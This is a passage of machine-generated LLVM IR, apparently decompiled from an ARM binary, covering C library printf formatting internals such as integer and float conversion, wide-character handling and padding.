  %v0_10440 = call i32 @_ppfs_setargs()
  store i32 %v0_10440, i32* %r0.global-to-local, align 4
  store i32 %v4_10448, i32* @ip, align 4
  store i32 %v2_10450, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_10424
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_10424
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_1045c, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_1046878 = phi i32 [ %v6_1045c, %bb133 ], [ %v2_10450, %.thread ]
  store i32 %v2_10470, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_10480187, label %dec_label_pc_10468, label %dec_label_pc_10484

dec_label_pc_10468:                               ; preds = %bb134, %dec_label_pc_10468
  %v5_10478189 = phi i32 [ %v5_10478, %dec_label_pc_10468 ], [ %v2_10470, %bb134 ]
  %v0_10468188 = phi i32 [ %v1_1046c, %dec_label_pc_10468 ], [ %v0_1046878, %bb134 ]
  %v2_10468 = add i32 %v5_10478189, -4
  %v3_10468 = inttoptr i32 %v2_10468 to i32*
  store i32 %v0_10468188, i32* %v3_10468, align 4
  %v0_1046c = load i32, i32* %r3.global-to-local, align 4
  %v1_1046c = add i32 %v0_1046c, 8
  store i32 %v1_1046c, i32* %r3.global-to-local, align 4
  %v0_10474.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10474.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_10470, i32* @lr, align 4
  %v4_10478 = mul i32 %v0_10474.pre, 4
  %v5_10478 = add i32 %v4_10478, %v2_10470
  %v1_1047c = add i32 %v0_10474.pre, 1
  store i32 %v1_1047c, i32* %r2.global-to-local, align 4
  %v5_10480 = icmp slt i32 %v0_10474.pre, %v1_10474.pre
  br i1 %v5_10480, label %dec_label_pc_10468, label %dec_label_pc_10484

dec_label_pc_10484:                               ; preds = %dec_label_pc_10468, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_10488, label %dec_label_pc_10490, label %dec_label_pc_104b4

dec_label_pc_10490:                               ; preds = %dec_label_pc_10484
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* @ip, align 4
  %v2_1049c = load i32, i32* %v1_1049c, align 4
  store i32 %v2_1049c, i32* %r0.global-to-local, align 4
  %v1_104a0 = and i32 %v0_104e4, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_104a8 = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_104a8, i32* %r3.global-to-local, align 4
  %v4_104ac = inttoptr i32 %v2_1049c to i8*
  %v5_104ac = call i32 @_store_inttype(i8* %v4_104ac, i32 %v1_104a0, i32 %stack_var_-336.2, i32 %v3_104a8)
  store i32 %v5_104ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_108fc

dec_label_pc_104b4:                               ; preds = %dec_label_pc_10484
  br i1 %tmp195, label %dec_label_pc_10640, label %dec_label_pc_104bc

dec_label_pc_104bc:                               ; preds = %dec_label_pc_104b4
  store i32 %v2_104c0, i32* %r3.global-to-local, align 4
  %v3_104c4 = load i8, i8* %v2_104c4, align 1
  %v4_104c4 = zext i8 %v3_104c4 to i32
  store i32 %v4_104c4, i32* @r4, align 4
  %v7_104c8 = icmp eq i8 %v3_104c4, 10
  br i1 %v7_104c8, label %dec_label_pc_104d4, label %bb135

bb135:                                            ; preds = %dec_label_pc_104bc
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_104d4:                               ; preds = %dec_label_pc_104bc
  store i32 %v0_104e4, i32* %r3.global-to-local, align 4
  %v1_104d8 = and i32 %v0_104e4, 32
  %v2_104d8 = icmp eq i32 %v1_104d8, 0
  %.175 = select i1 %v2_104d8, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_104e4 = and i32 %v0_104e4, 64
  %v2_104e4 = icmp eq i32 %v1_104e4, 0
  br i1 %v2_104e4, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_104d4
  %.176 = select i1 %v2_104d8, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_104d4, %bb138
  br i1 %v3_104f0, label %.thread84, label %dec_label_pc_104f8

.thread84:                                        ; preds = %bb139
  %v5_104f0 = sub nsw i32 0, %v4_104c4
  store i32 %v5_104f0, i32* @r4, align 4
  br label %dec_label_pc_10510

dec_label_pc_104f8:                               ; preds = %bb139
  br i1 %v7_105d8, label %bb140, label %dec_label_pc_10504

bb140:                                            ; preds = %dec_label_pc_104f8
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_10510

dec_label_pc_10504:                               ; preds = %dec_label_pc_104f8
  br i1 %v7_10524, label %dec_label_pc_10514, label %dec_label_pc_10510

dec_label_pc_10510:                               ; preds = %.thread84, %bb140, %dec_label_pc_10504
  %v0_1053c86 = phi i32 [ %v5_104f0, %.thread84 ], [ %v4_104c4, %bb140 ], [ %v4_104c4, %dec_label_pc_10504 ]
  br label %dec_label_pc_10514

dec_label_pc_10514:                               ; preds = %dec_label_pc_10504, %dec_label_pc_10510
  %v0_1053c85 = phi i32 [ %v0_1053c86, %dec_label_pc_10510 ], [ %v4_104c4, %dec_label_pc_10504 ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_10510 ], [ 6, %dec_label_pc_10504 ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_10514 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_10514, i32* %r3.global-to-local, align 4
  %v1_10518 = icmp slt i32 %v3_10514, 0
  %v7_1051c. = select i1 %v1_10518, i32 %v7_1051c, i32 32
  store i32 %v7_1051c., i32* @sb, align 4
  br i1 %v7_10524, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_10514
  store i32 %v2_10470, i32* @lr, align 4
  %v2_1052c = load i32, i32* @ip, align 4
  %v5_1052c = mul i32 %v2_1052c, 4
  %v6_1052c = add i32 %v5_1052c, %v2_10470
  store i32 %v6_1052c, i32* %r3.global-to-local, align 4
  %v2_10530 = add i32 %v6_1052c, -260
  %v3_10530 = inttoptr i32 %v2_10530 to i32*
  %v4_10530 = load i32, i32* %v3_10530, align 4
  store i32 %v4_10530, i32* %r3.global-to-local, align 4
  %v2_10538 = and i32 %v4_10530, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_10514, %.thread16
  %storemerge94 = phi i32 [ %v2_10538, %.thread16 ], [ 1024, %dec_label_pc_10514 ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_1053c85, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_10544 = call i32 @_load_inttype()
  %v0_10548 = load i32, i32* @r1, align 4
  store i32 %v0_10548, i32* %r2.global-to-local, align 4
  %v0_10554 = load i32, i32* @r4, align 4
  store i32 %v0_10554, i32* %r3.global-to-local, align 4
  store i32 %v2_10558, i32* %r0.global-to-local, align 4
  %v0_1055c = load i32, i32* @r5, align 4
  %v6_10560 = call i32 @_uintmaxtostr(i8* %v5_10560, i32 %v0_10544, i32 %v0_10548, i32 %v0_10554, i32 %v0_1055c)
  store i32 %v6_10560, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_10560, i32* @r6, align 4
  br i1 %v3_10570, label %bb148, label %dec_label_pc_10574

dec_label_pc_10574:                               ; preds = %bb145
  %v7_10560 = inttoptr i32 %v6_10560 to i8*
  %v3_10574 = load i8, i8* %v7_10560, align 1
  %v7_10578 = icmp eq i8 %v3_10574, 45
  %v2_10580 = or i32 %v0_104e4, 2
  %v2_10580.stack_var_-316.4 = select i1 %v7_10578, i32 %v2_10580, i32 %v0_104e4
  store i32 %v2_10580.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_10578, label %.thread18, label %dec_label_pc_10594

.thread18:                                        ; preds = %dec_label_pc_10574
  %v3_10584 = add i32 %v6_10560, 1
  store i32 %v3_10584, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_10594:                               ; preds = %dec_label_pc_10574
  %v1_10594 = and i32 %v2_10580.stack_var_-316.4, 2
  %v2_10594 = icmp eq i32 %v1_10594, 0
  br i1 %v2_10594, label %dec_label_pc_105a0, label %bb146

bb146:                                            ; preds = %dec_label_pc_10594
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_105a0:                               ; preds = %dec_label_pc_10594
  %v1_105a0 = urem i32 %v2_10580.stack_var_-316.4, 2
  %v2_105a0 = icmp eq i32 %v1_105a0, 0
  br i1 %v2_105a0, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_105a0
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_105a0, %bb147
  %v0_105fc = phi i32 [ %v6_10560, %bb145 ], [ %v3_10584, %.thread18 ], [ %v6_10560, %dec_label_pc_105a0 ], [ %v6_10560, %bb147 ], [ %v6_10560, %bb146 ]
  %v0_105b8 = phi i32 [ %v0_104e4, %bb145 ], [ %v2_10580, %.thread18 ], [ %v0_104e4, %dec_label_pc_105a0 ], [ %v0_104e4, %bb147 ], [ %v0_104e4, %bb146 ]
  %v3_105a8 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_105a8, i32* %r2.global-to-local, align 4
  store i32 %v0_105b8, i32* %r3.global-to-local, align 4
  %v1_105b0 = icmp slt i32 %v3_105a8, 0
  br i1 %v1_105b0, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_105e0 = phi i32 [ %v3_105a8, %bb148 ], [ 1, %bb149 ]
  %v1_105b8 = and i32 %v0_105b8, 16
  %v2_105b8 = icmp eq i32 %v1_105b8, 0
  store i32 %v2_1078c, i32* %r3.global-to-local, align 4
  %v2_105c0 = sub i32 %v2_1078c, %v0_105fc
  %v1_105c4 = add i32 %v2_105c0, 127
  store i32 %v1_105c4, i32* @r5, align 4
  br i1 %v2_105b8, label %bb157, label %dec_label_pc_105cc

dec_label_pc_105cc:                               ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_105cc
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_105cc, %bb151
  br i1 %v7_105d8, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_105e0, %v1_105c4
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_105e4, label %dec_label_pc_105ec, label %bb157

dec_label_pc_105ec:                               ; preds = %bb155
  %v1_105ec = inttoptr i32 %v0_105fc to i8*
  %v2_105ec = load i8, i8* %v1_105ec, align 1
  %v3_105ec = zext i8 %v2_105ec to i32
  store i32 %v3_105ec, i32* %r3.global-to-local, align 4
  %v7_105f0 = icmp eq i8 %v2_105ec, 48
  br i1 %v7_105f0, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_105ec
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_105ec
  %v2_105f8 = add i32 %v2_105c0, 128
  store i32 %v2_105f8, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_10634 = phi i32 [ %v0_105e0, %bb155 ], [ %v0_105e0, %bb150 ], [ 1, %bb156 ], [ %v2_105f8, %.thread25 ], [ %v0_105e0, %bb154 ]
  %v1_105fc = inttoptr i32 %v0_105fc to i8*
  %v2_105fc = load i8, i8* %v1_105fc, align 1
  %v3_105fc = zext i8 %v2_105fc to i32
  store i32 %v3_105fc, i32* %r3.global-to-local, align 4
  %v7_10600 = icmp eq i8 %v2_105fc, 48
  br i1 %v7_10600, label %dec_label_pc_10608, label %dec_label_pc_10630

dec_label_pc_10608:                               ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_1060c = load i32, i32* @r7, align 4
  %v7_10610 = icmp slt i32 %v0_1060c, 6
  br i1 %v7_10610, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_10608
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_10608, %bb158
  br i1 %v7_10524, label %.thread26, label %dec_label_pc_10624

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_1a044.633 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_107a4

dec_label_pc_10624:                               ; preds = %bb159
  %v2_10624 = icmp eq i32 %v5_10634, 0
  br i1 %v2_10624, label %bb160, label %dec_label_pc_10630

bb160:                                            ; preds = %dec_label_pc_10624
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_107a4

dec_label_pc_10630:                               ; preds = %dec_label_pc_10624, %bb157
  %v2_10630 = sub i32 %v5_10634, %v1_105c4
  %tmp199 = icmp ugt i32 %v5_10634, %v1_105c4
  br i1 %tmp199, label %.thread90, label %dec_label_pc_107a4

.thread90:                                        ; preds = %dec_label_pc_10630
  store i32 %v2_10630, i32* @r4, align 4
  br label %dec_label_pc_107c0thread-pre-split

dec_label_pc_10640:                               ; preds = %dec_label_pc_104b4
  br i1 %tmp196, label %dec_label_pc_1067c, label %dec_label_pc_10648

dec_label_pc_10648:                               ; preds = %dec_label_pc_10640
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_10654 = load i32, i32* @fp, align 4
  store i32 %v0_10654, i32* %r0.global-to-local, align 4
  %v2_10658 = load i32, i32* %v1_1049c, align 4
  %v5_10658 = load i32, i32* %v4_10658, align 4
  store i32 %v5_10658, i32* %r2.global-to-local, align 4
  store i32 %v2_1065c, i32* %r3.global-to-local, align 4
  %v6_10660 = call i32 @_fpmaxtostr(i32 %v0_10654, i32 %v2_10658, i32 %v5_10658, i32* nonnull %stack_var_-328, i32 66240)
  store i32 %v6_10660, i32* %r0.global-to-local, align 4
  %v1_10664 = icmp slt i32 %v6_10660, 0
  br i1 %v1_10664, label %dec_label_pc_10910, label %dec_label_pc_1066c

dec_label_pc_1066c:                               ; preds = %dec_label_pc_10648
  %v2_10670 = add i32 %v6_10660, %stack_var_-336.2
  store i32 %v2_10670, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_108fc

dec_label_pc_1067c:                               ; preds = %dec_label_pc_10640
  br i1 %v3_10680, label %dec_label_pc_1071c, label %dec_label_pc_10684

dec_label_pc_10684:                               ; preds = %dec_label_pc_1067c
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_1067c, label %dec_label_pc_10694, label %dec_label_pc_106e4

dec_label_pc_10694:                               ; preds = %dec_label_pc_10684
  %v2_10694 = load i32, i32* %v1_1049c, align 4
  store i32 %v2_10694, i32* %r3.global-to-local, align 4
  %v9_10698 = icmp eq i32 %v2_10694, 0
  store i32 %v2_10694, i32* %stack_var_-44, align 4
  br i1 %v9_10698, label %dec_label_pc_107ac, label %dec_label_pc_106a4

dec_label_pc_106a4:                               ; preds = %dec_label_pc_10694
  %v3_106a4 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_106a4, i32* %r3.global-to-local, align 4
  store i32 %v2_106a8, i32* @r0, align 4
  %v5_106b4 = icmp slt i32 %v3_106a4, -1
  br i1 %v5_106b4, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_106a4
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_106a4, %bb161
  %storemerge193 = phi i32 [ %v3_106a4, %bb161 ], [ -1, %dec_label_pc_106a4 ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_106a8, i32* @r1, align 4
  store i32 %v2_106bc, i32* %r3.global-to-local, align 4
  %v0_106c0 = call i32 @__GI_wcsrtombs()
  store i32 %v0_106c0, i32* %r0.global-to-local, align 4
  %v7_106c4 = icmp eq i32 %v0_106c0, -1
  store i32 %v0_106c0, i32* @r5, align 4
  br i1 %v7_106c4, label %dec_label_pc_10910, label %dec_label_pc_106d0

dec_label_pc_106d0:                               ; preds = %bb162
  %v0_106d0 = load i32, i32* @sl, align 4
  store i32 %v0_106d0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_106d0, i32* @r6, align 4
  br label %dec_label_pc_107c0

dec_label_pc_106e4:                               ; preds = %dec_label_pc_10684
  store i32 %v2_1078c, i32* %r8.global-to-local, align 4
  %v2_106e8 = load i32, i32* %v1_1049c, align 4
  store i32 %v2_106bc, i32* %r2.global-to-local, align 4
  store i32 %v2_1078c, i32* %r0.global-to-local, align 4
  %v3_106f4 = call i32 @__GI_wcrtomb(i32 %v2_1078c, i32 %v2_106e8, i32 %v2_106bc)
  store i32 %v3_106f4, i32* %r0.global-to-local, align 4
  %v7_106f8 = icmp eq i32 %v3_106f4, -1
  store i32 %v3_106f4, i32* @r5, align 4
  br i1 %v7_106f8, label %dec_label_pc_10910, label %dec_label_pc_10704

dec_label_pc_10704:                               ; preds = %dec_label_pc_106e4
  %v0_10704 = load i32, i32* @sl, align 4
  store i32 %v0_10704, i32* @r4, align 4
  store i32 %v2_1078c, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_10714 = trunc i32 %v0_10704 to i8
  %v2_10714 = load i32, i32* %r8.global-to-local, align 4
  %v4_10714 = add i32 %v2_10714, %v3_106f4
  %v5_10714 = inttoptr i32 %v4_10714 to i8*
  store i8 %v1_10714, i8* %v5_10714, align 1
  %v0_107c4.pre.pre = load i32, i32* @r5, align 4
  %v1_107c4.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_107c0thread-pre-split

dec_label_pc_1071c:                               ; preds = %dec_label_pc_1067c
  br i1 %v3_10720, label %dec_label_pc_10780, label %dec_label_pc_10724

dec_label_pc_10724:                               ; preds = %dec_label_pc_1071c
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_1072c = load i32, i32* %v1_1049c, align 4
  br i1 %v7_1071c, label %dec_label_pc_1072c, label %dec_label_pc_10758

dec_label_pc_1072c:                               ; preds = %dec_label_pc_10724
  store i32 %v2_1072c, i32* @r6, align 4
  %v2_10730 = icmp eq i32 %v2_1072c, 0
  br i1 %v2_10730, label %dec_label_pc_107ac, label %dec_label_pc_10738

dec_label_pc_10738:                               ; preds = %dec_label_pc_1072c, %dec_label_pc_10788
  %v0_10748 = phi i32 [ %v2_1072c, %dec_label_pc_1072c ], [ %v3_10798, %dec_label_pc_10788 ]
  %v3_10738 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_10738, i32* %r3.global-to-local, align 4
  %v5_10744 = icmp slt i32 %v3_10738, -1
  br i1 %v5_10744, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_10738
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_10738, %bb163
  %storemerge194 = phi i32 [ %v3_10738, %bb163 ], [ -1, %dec_label_pc_10738 ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_10748, i32* %r0.global-to-local, align 4
  %v1_1074c = inttoptr i32 %v0_10748 to i8*
  %v2_1074c = call i32 @strnlen(i8* %v1_1074c)
  store i32 %v2_1074c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_107b4

dec_label_pc_10758:                               ; preds = %dec_label_pc_10724
  store i32 %v2_1072c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_1078c, i32* @r6, align 4
  store i32 %v2_1072c, i32* %stack_var_-180, align 4
  br label %dec_label_pc_107c0thread-pre-split

dec_label_pc_10780:                               ; preds = %dec_label_pc_1071c
  br i1 %v7_10780, label %dec_label_pc_10788, label %dec_label_pc_10910

dec_label_pc_10788:                               ; preds = %dec_label_pc_10780
  %v0_10788 = call i32 @__errno_location()
  store i32 %v0_10788, i32* %r0.global-to-local, align 4
  %v1_10790 = inttoptr i32 %v0_10788 to i32*
  %v2_10790 = load i32, i32* %v1_10790, align 4
  store i32 %v2_10790, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_10798 = call i32 @__GI___glibc_strerror_r(i32 %v2_10790, i32 %v2_1078c, i32 128)
  store i32 %v3_10798, i32* %r0.global-to-local, align 4
  store i32 %v3_10798, i32* @r6, align 4
  br label %dec_label_pc_10738

dec_label_pc_107a4:                               ; preds = %dec_label_pc_10630, %.thread26, %bb160
  %v0_107c4.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_105c4, %dec_label_pc_10630 ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_107c0thread-pre-split

dec_label_pc_107ac:                               ; preds = %dec_label_pc_1072c, %dec_label_pc_10694
  store i32 ptrtoint ([7 x i8]* @global_var_1a04c.636 to i32), i32* @r6, align 4
  br label %dec_label_pc_107b4

dec_label_pc_107b4:                               ; preds = %bb164, %dec_label_pc_107ac
  %storemerge = phi i32 [ 6, %dec_label_pc_107ac ], [ %v2_1074c, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_107c0

dec_label_pc_107c0thread-pre-split:               ; preds = %.thread90, %dec_label_pc_10704, %dec_label_pc_10758, %dec_label_pc_107a4
  %v1_107c4.pre = phi i32 [ 0, %dec_label_pc_107a4 ], [ %v1_107c4.pre.pre, %dec_label_pc_10704 ], [ 0, %dec_label_pc_10758 ], [ %v2_10630, %.thread90 ]
  %v0_107c4.pre = phi i32 [ %v0_107c4.pre81, %dec_label_pc_107a4 ], [ %v0_107c4.pre.pre, %dec_label_pc_10704 ], [ 1, %dec_label_pc_10758 ], [ %v1_105c4, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_105b8, %dec_label_pc_107a4 ], [ %v0_104e4, %dec_label_pc_10704 ], [ %v0_104e4, %dec_label_pc_10758 ], [ %v0_105b8, %.thread90 ]
  %v0_107c0.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_107c0

dec_label_pc_107c0:                               ; preds = %dec_label_pc_107c0thread-pre-split, %dec_label_pc_106d0, %dec_label_pc_107b4
  %v1_10800 = phi i32 [ %v1_107c4.pre, %dec_label_pc_107c0thread-pre-split ], [ %v0_106d0, %dec_label_pc_106d0 ], [ 0, %dec_label_pc_107b4 ]
  %v0_107c4 = phi i32 [ %v0_107c4.pre, %dec_label_pc_107c0thread-pre-split ], [ %v0_106c0, %dec_label_pc_106d0 ], [ %storemerge, %dec_label_pc_107b4 ]
  %v0_107cc = phi i32 [ %v0_107c0.pr, %dec_label_pc_107c0thread-pre-split ], [ 11, %dec_label_pc_106d0 ], [ 11, %dec_label_pc_107b4 ]
  %v0_10808 = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_107c0thread-pre-split ], [ %v0_104e4, %dec_label_pc_106d0 ], [ %v0_104e4, %dec_label_pc_107b4 ]
  %v7_107c0 = icmp eq i32 %v0_107cc, 11
  %v2_107c4 = add i32 %v0_107c4, %v1_10800
  br i1 %v7_107c0, label %dec_label_pc_107dc, label %bb165

bb165:                                            ; preds = %dec_label_pc_107c0
  %v7_107d4 = icmp sgt i32 %v0_107cc, 5
  %. = select i1 %v7_107d4, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_107d8 = add i32 %., %v2_107c4
  br label %dec_label_pc_107dc

dec_label_pc_107dc:                               ; preds = %dec_label_pc_107c0, %bb165
  %v0_107f0 = phi i32 [ %v2_107c4, %dec_label_pc_107c0 ], [ %v2_107d8, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_107e0 = sub i32 %tmp97, %v0_107f0
  %v3_107e0 = icmp uge i32 %tmp97, %v0_107f0
  %v9_107e0 = icmp eq i32 %tmp97, %v0_107f0
  %v2_107e4 = xor i1 %v3_107e0, true
  %v3_107e4 = or i1 %v9_107e0, %v2_107e4
  br i1 %v3_107e4, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_107dc
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_107dc, %bb166
  %v2_107e8 = xor i1 %v9_107e0, true
  %v3_107e8 = and i1 %v3_107e0, %v2_107e8
  br i1 %v3_107e8, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_107f0.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_107e0, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_10800 = phi i32 [ %v1_107f0.pre, %._crit_edge ], [ %v2_107e0, %bb168 ]
  %v2_107f0 = add i32 %v0_107f0, %stack_var_-336.2
  %v2_107f4 = add i32 %v2_107f0, %v2_10800
  store i32 %v2_107f4, i32* @ip, align 4
  store i32 %v0_10808, i32* %r3.global-to-local, align 4
  %v0_107fc = load i32, i32* @sb, align 4
  %v7_107fc = icmp eq i32 %v0_107fc, 48
  br i1 %v7_107fc, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_10800 = add i32 %v2_10800, %v1_10800
  store i32 %v3_10800, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_1081c = phi i32 [ %v2_10800, %bb169 ], [ 0, %bb170 ]
  %v1_10808 = and i32 %v0_10808, 8
  store i32 %v1_10808, i32* @r8, align 4
  %v2_10808 = icmp eq i32 %v1_10808, 0
  br i1 %v2_10808, label %dec_label_pc_10814, label %dec_label_pc_10830

dec_label_pc_10814:                               ; preds = %.thread29
  %v0_10814 = load i32, i32* @fp, align 4
  store i32 %v0_10814, i32* %r0.global-to-local, align 4
  store i32 %v0_1081c, i32* %r2.global-to-local, align 4
  %v4_10820 = call i32 @_charpad(i32 %v0_10814, i8 32, i32 %v0_1081c)
  store i32 %v4_10820, i32* %r0.global-to-local, align 4
  %v1_10824 = load i32, i32* @sl, align 4
  %v9_10824 = icmp eq i32 %v4_10820, %v1_10824
  br i1 %v9_10824, label %dec_label_pc_1082c, label %dec_label_pc_10910

dec_label_pc_1082c:                               ; preds = %dec_label_pc_10814
  %v0_1082c = load i32, i32* @r8, align 4
  store i32 %v0_1082c, i32* @sl, align 4
  %v0_10838.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10830

dec_label_pc_10830:                               ; preds = %.thread29, %dec_label_pc_1082c
  %v0_10838 = phi i32 [ %v0_107cc, %.thread29 ], [ %v0_10838.pre, %dec_label_pc_1082c ]
  %v0_10834 = load i32, i32* @fp, align 4
  %v2_10838 = add i32 %v0_10838, ptrtoint (i32* @global_var_1a054.638 to i32)
  store i32 %v2_10838, i32* %r0.global-to-local, align 4
  %v2_1083c = inttoptr i32 %v2_10838 to i8*
  %v3_1083c = call i32 @__GI_fputs_unlocked(i8* %v2_1083c, i32 %v0_10834)
  %v0_10840 = load i32, i32* @fp, align 4
  store i32 %v0_10840, i32* %r0.global-to-local, align 4
  %v0_10848 = load i32, i32* @r4, align 4
  store i32 %v0_10848, i32* %r2.global-to-local, align 4
  %v4_1084c = call i32 @_charpad(i32 %v0_10840, i8 48, i32 %v0_10848)
  store i32 %v4_1084c, i32* %r0.global-to-local, align 4
  %v1_10850 = load i32, i32* @r4, align 4
  %v9_10850 = icmp eq i32 %v4_1084c, %v1_10850
  br i1 %v9_10850, label %dec_label_pc_10858, label %dec_label_pc_10910

dec_label_pc_10858:                               ; preds = %dec_label_pc_10830
  %v3_10858 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_10858, i32* %r3.global-to-local, align 4
  %v2_1085c = icmp eq i32 %v3_10858, 0
  br i1 %v2_1085c, label %dec_label_pc_1086c, label %dec_label_pc_108ccthread-pre-split

dec_label_pc_1086c:                               ; preds = %dec_label_pc_10858
  %v0_1086c = load i32, i32* @r5, align 4
  %v2_1086c = icmp eq i32 %v0_1086c, 0
  br i1 %v2_1086c, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_1086c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_1086c
  %v1_10874 = load i32, i32* @r6, align 4
  store i32 %v1_10874, i32* %r0.global-to-local, align 4
  %v1_1087c = load i32, i32* @fp, align 4
  store i32 %v1_1087c, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 67716, i32* @lr, align 4
  %v1_10880 = xor i1 %v2_1086c, true
  call void @__pseudo_cond_branch(i1 %v1_10880, i32 ptrtoint (i32* @global_var_13f14.629 to i32))
  %v0_10884 = load i32, i32* %r0.global-to-local, align 4
  %v1_10884 = load i32, i32* @r5, align 4
  %v9_10884 = icmp eq i32 %v0_10884, %v1_10884
  br i1 %v9_10884, label %dec_label_pc_108e4, label %dec_label_pc_10910

dec_label_pc_10890:                               ; preds = %dec_label_pc_108cc
